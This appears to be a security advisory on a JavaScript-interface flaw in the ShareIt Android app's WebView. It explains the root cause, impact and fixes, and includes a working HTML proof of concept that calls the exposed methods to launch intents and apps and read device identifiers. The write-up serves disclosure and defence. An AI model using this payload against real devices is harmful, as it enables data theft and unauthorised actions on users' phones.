
# Insecure WebView JavaScript Interface — `com.lenovo.anyshare.gps` (ShareIt)

## 📌 Summary
The ShareIt Android app exposes a WebView (`WebClientActivity`) with a JavaScript interface named `client`.  
This interface exposes multiple high-risk methods that allow untrusted JavaScript to trigger **arbitrary system actions**.

Attackers can host a malicious page, load it in ShareIt’s WebView, and then invoke the exposed methods to:

- Start arbitrary **activities** in any installed app.
- Send arbitrary **broadcasts**.
- Start arbitrary **services**.
- Execute arbitrary **run()** commands to launch installed apps.
- Collect sensitive device information, including GAID, user IDs, and device info, without permissions or user consent.

---

## 🧩 Affected Components

### `WebClientActivity`
```java
this.o.addJavascriptInterface(new WebClient(), "client");
````

### Key Exposed Methods

* `executeSystemEvent(int type, String intentUri)`
* `run(String packageName)`
* `getGAID()`
* `getDeviceInfo()`
* `getSzUserInfo()` / `getUserInfo()`

### Underlying Engine

`executeSystemEvent` delegates to `yt2.b().b(...)` → `ms8.c(...)` which parses arbitrary `Intent` URIs and directly calls:

* `startActivity`
* `sendBroadcast`
* `startService`

---

## ⚙️ Root Cause

* The `JavascriptInterface` annotation makes the `client` object accessible to any JavaScript loaded into the WebView.
* The app does not enforce a trusted origin or sanitize input.
* The intent handler (`ms8`) executes arbitrary URIs without validation.

---

## 💥 Impact

An attacker controlling the WebView content can:

* Start **any exported activity** of any installed app.
* Send **arbitrary broadcasts**, possibly invoking sensitive receivers.
* Start **arbitrary services**.
* Launch apps silently via `run()`.
* Steal identifiers via `getGAID`, `getDeviceInfo`, `getSzUserInfo`, and `getUserInfo`.

This can lead to privilege escalation, sensitive data exfiltration, or local DoS.

---

## 🧪 Proof of Concept (Generic)

### HTML PoC

```html
<html>
  <body>
    <h3>Generic PoC for ShareIt WebView Vulnerabilities</h3>
    <pre id="log"></pre>
    <script>
      function print(msg) {
        document.getElementById("log").textContent += msg + "\n";
      }

      // Generic harmless intent (opens Settings app)
      var genericIntent = "intent:#Intent;action=android.intent.action.VIEW;" +
                          "component=com.android.settings/.Settings;end";

      // Test 1: Start Activity
      try {
        client.executeSystemEvent(1, genericIntent);
        print("Started Activity via executeSystemEvent");
      } catch (e) {
        print(e);
      }

      // Test 2: Broadcast
      try {
        client.executeSystemEvent(2, genericIntent);
        print("Broadcast sent via executeSystemEvent");
      } catch (e) {
        print(e);
      }

      // Test 3: Start Service
      try {
        client.executeSystemEvent(3, genericIntent);
        print("Service started via executeSystemEvent");
      } catch (e) {
        print(e);
      }

      // Test 4: Launch App via run()
      try {
        client.run("com.android.calculator2");
        print("Launched calculator via run()");
      } catch (e) {
        print(e);
      }

      // Test 5: Data leaks
      try {
        print("GAID: " + client.getGAID());
        print("Device Info: " + client.getDeviceInfo());
      } catch (e) {
        print(e);
      }
    </script>
  </body>
</html>
```

This PoC demonstrates the vulnerabilities generically without triggering real calls.

---

## 🔍 Technical Details

**Code Path:**

```java
if (i == 1) context.startActivity(Intent.parseUri(str2, 0));
else if (i == 2) context.sendBroadcast(Intent.parseUri(str2, 0));
else if (i == 3) context.startService(Intent.parseUri(str2, 0));
```

**Run App:**

```java
public void run(String pkg) {
  Intent launchIntent = getPackageManager().getLaunchIntentForPackage(pkg);
  startActivity(launchIntent);
}
```

**Data Leaks:**

```java
public String getGAID() { return DeviceHelper.getGAID(context); }
public String getDeviceInfo() { return wq9.f(context).k().toString(); }
```

---

## 🚨 Severity

**Critical** — Arbitrary intent execution and sensitive data exfiltration from untrusted JavaScript.

---

## 🛠 Recommendations

* Remove or restrict the `JavascriptInterface` from untrusted WebViews.
* Validate and whitelist any `Intent` URIs before execution.
* Require user interaction/consent before launching external apps or collecting device identifiers.
* Use a secure IPC mechanism instead of exposing system-level actions to WebView JavaScript.

---

## 📸 Visual Demo

![screenshot1](https://github.com/user-attachments/assets/cc14759e-6b9b-4b5c-a770-740ec431862b)
![screenshot2](https://github.com/user-attachments/assets/57fc4486-564e-40ed-8f8e-4bc71c2f73bc)
![PoC demo GIF](https://github.com/actuator/com.lenovo.anyshare.gps/blob/main/shareitIntent.gif)


## 📚 References

* [Android WebView security guidelines](https://developer.android.com/guide/webapps/webview)
* [Unsafe JavaScript interfaces](https://developer.android.com/training/articles/security-tips#WebView)

